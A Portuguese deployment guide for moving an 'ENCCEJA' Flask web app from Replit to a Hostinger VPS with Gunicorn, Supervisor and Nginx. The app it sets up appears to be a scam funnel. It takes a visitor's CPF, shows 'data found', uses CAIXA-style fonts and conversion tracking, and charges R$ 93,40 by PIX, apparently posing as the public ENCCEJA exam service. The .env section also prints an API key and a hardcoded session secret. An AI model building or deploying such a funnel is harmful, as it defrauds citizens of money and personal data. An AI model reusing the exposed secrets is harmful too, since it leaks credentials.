# Deploy Completo ENCCEJA na Hostinger VPS

## 🚀 Situação Atual
✅ Projeto ENCCEJA funcionando perfeitamente no Replit
✅ WitePay integrado (R$ 93,40 PIX payments)
✅ Google Pixel tracking configurado
✅ Funil completo: CPF → Dados → Pagamento
🎯 Meta: Transferir para Hostinger VPS com Python

## 📋 Pré-requisitos
- ✅ Hostinger VPS contratado
- ✅ MobaXterm instalado
- ✅ Dados de acesso SSH do VPS
- ✅ Domínio apontando para IP do VPS

## 🔧 Passo 1: Preparar Arquivos Localmente

### Baixar projeto completo do Replit:
1. **Replit** → **File Explorer** 
2. Baixar `encceja-python-completo.zip` (50MB)
3. Extrair localmente para verificar estrutura

### Estrutura esperada:
```
encceja-projeto/
├── app.py                   # Aplicação Flask principal
├── main.py                  # Ponto de entrada
├── witepay_gateway.py       # Gateway WitePay
├── requirements.txt         # Dependências Python
├── .env                     # Variáveis de ambiente
├── templates/               # Templates HTML
│   ├── index.html          # Página inicial CPF
│   ├── encceja_info.html   # Dados encontrados
│   ├── pagamento.html      # Pagamento PIX
│   ├── validar_dados.html  # Confirmar dados
│   └── shared_resources.html
└── static/                  # Recursos estáticos
    ├── css/output.css      # Tailwind CSS compilado
    └── fonts/              # Fontes CAIXA
```

## 🔌 Passo 2: Conectar no VPS via MobaXterm

### Configurar conexão SSH:
1. **MobaXterm** → **Session** → **SSH**
2. **Remote host**: IP do seu VPS Hostinger
3. **Username**: root (ou usuário fornecido)
4. **Port**: 22
5. **Password**: senha do VPS
6. **Conectar**

### Comandos iniciais no VPS:
```bash
# Atualizar sistema
apt update && apt upgrade -y

# Instalar Python e dependências
apt install python3 python3-pip python3-venv nginx supervisor -y

# Verificar instalação
python3 --version
pip3 --version
```

## 📁 Passo 3: Preparar Diretório do Projeto

```bash
# Criar diretório
mkdir -p /var/www/encceja
cd /var/www/encceja

# Criar ambiente virtual
python3 -m venv venv
source venv/bin/activate

# Verificar ambiente ativo
which python
```

## 📤 Passo 4: Upload via MobaXterm

### Método A: Upload do ZIP (Recomendado)
1. **Painel esquerdo** (local): Navegar até pasta com `encceja-python-completo.zip`
2. **Painel direito** (VPS): Navegar até `/var/www/encceja/`
3. **Arrastar** o ZIP para o VPS
4. **Extrair no VPS**:
```bash
cd /var/www/encceja
unzip encceja-python-completo.zip
ls -la  # Verificar arquivos
```

### Método B: Upload pasta por pasta
1. **Extrair ZIP localmente**
2. **Arrastar** cada pasta (templates, static) para `/var/www/encceja/`
3. **Arrastar** cada arquivo (.py, .txt, .env) para `/var/www/encceja/`

## 🐍 Passo 5: Configurar Python Environment

```bash
cd /var/www/encceja
source venv/bin/activate

# Instalar dependências
pip install -r requirements.txt

# Dependências principais esperadas:
pip install flask gunicorn python-dotenv requests qrcode[pil] twilio email-validator flask-sqlalchemy psycopg2-binary

# Verificar instalação
pip list
```

## ⚙️ Passo 6: Configurar Variáveis de Ambiente

```bash
nano /var/www/encceja/.env
```

**Conteúdo do .env:**
```env
SESSION_SECRET=encceja_secret_key_2025_production
WITEPAY_API_KEY=wtp_7819b0bb469f4b52a96feca4ddc46ba4
DOMAIN_RESTRICTION_ENABLED=false
FLASK_ENV=production
GOOGLE_PIXEL_ID=6859ccee5af20eab22a408ef
DEBUG=false
```

## 🧪 Passo 7: Testar Aplicação

```bash
cd /var/www/encceja
source venv/bin/activate

# Teste rápido
python main.py
# Deve mostrar: Running on http://0.0.0.0:5000

# Em outro terminal SSH, testar:
curl http://localhost:5000
# Deve retornar HTML da página inicial

# Parar aplicação (Ctrl+C)
```

## 🔄 Passo 8: Configurar Supervisor

```bash
nano /etc/supervisor/conf.d/encceja.conf
```

**Conteúdo:**
```ini
[program:encceja]
command=/var/www/encceja/venv/bin/gunicorn --bind 0.0.0.0:5000 --workers 2 --timeout 120 main:app
directory=/var/www/encceja
user=root
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/var/log/encceja.log
stderr_logfile=/var/log/encceja_error.log
environment=PATH="/var/www/encceja/venv/bin"
```

```bash
# Atualizar supervisor
supervisorctl reread
supervisorctl update
supervisorctl start encceja
supervisorctl status
```

## 🌐 Passo 9: Configurar Nginx

```bash
nano /etc/nginx/sites-available/encceja
```

**Conteúdo:**
```nginx
server {
    listen 80;
    server_name seu-dominio.com www.seu-dominio.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60;
        proxy_send_timeout 60;
        proxy_read_timeout 60;
    }

    location /static {
        alias /var/www/encceja/static;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }

    access_log /var/log/nginx/encceja_access.log;
    error_log /var/log/nginx/encceja_error.log;
}
```

```bash
# Ativar site
ln -s /etc/nginx/sites-available/encceja /etc/nginx/sites-enabled/

# Remover site padrão
rm /etc/nginx/sites-enabled/default

# Testar configuração
nginx -t

# Reiniciar nginx
systemctl restart nginx
systemctl status nginx
```

## 🔍 Passo 10: Verificação Final

### Comandos de verificação:
```bash
# 1. Status dos serviços
supervisorctl status
systemctl status nginx

# 2. Aplicação respondendo
curl -I http://localhost:5000
curl -I http://IP_DO_VPS

# 3. Logs em tempo real
tail -f /var/log/encceja.log

# 4. Testar domínio
curl -I http://seu-dominio.com
```

### URLs funcionais esperadas:
- `http://seu-dominio.com/` - Consulta CPF
- `http://seu-dominio.com/encceja-info` - Dados encontrados
- `http://seu-dominio.com/validar-dados` - Confirmar dados
- `http://seu-dominio.com/pagamento` - PIX R$ 93,40

## 🛠️ Comandos de Manutenção

### Reiniciar aplicação:
```bash
supervisorctl restart encceja
```

### Ver logs:
```bash
tail -f /var/log/encceja.log
tail -f /var/log/nginx/error.log
```

### Atualizar código:
```bash
cd /var/www/encceja
# Upload novos arquivos via MobaXterm
supervisorctl restart encceja
```

## 🚨 Troubleshooting

### Erro 403 Forbidden:
```bash
# Verificar permissões
chown -R www-data:www-data /var/www/encceja
chmod -R 755 /var/www/encceja

# Verificar se app está rodando
netstat -tlnp | grep :5000
```

### Erro 502 Bad Gateway:
```bash
# Verificar logs da aplicação
tail -20 /var/log/encceja.log

# Reinstalar dependências
cd /var/www/encceja
source venv/bin/activate
pip install -r requirements.txt --force-reinstall
```

### Aplicação não inicia:
```bash
# Teste manual
cd /var/www/encceja
source venv/bin/activate
python main.py
```

## ✅ Checklist Final

- [ ] VPS configurado com Python 3
- [ ] Projeto uploadado via MobaXterm
- [ ] Ambiente virtual criado
- [ ] Dependências instaladas
- [ ] .env configurado com chaves
- [ ] Supervisor configurado
- [ ] Nginx configurado
- [ ] Domínio apontando para VPS
- [ ] Aplicação respondendo
- [ ] URLs do funil funcionais
- [ ] Pagamentos PIX gerando
- [ ] Tracking funcionando

## 🎯 Resultado Esperado

Após seguir todos os passos, seu projeto ENCCEJA estará rodando em:
`http://seu-dominio.com` com o funil completo funcional!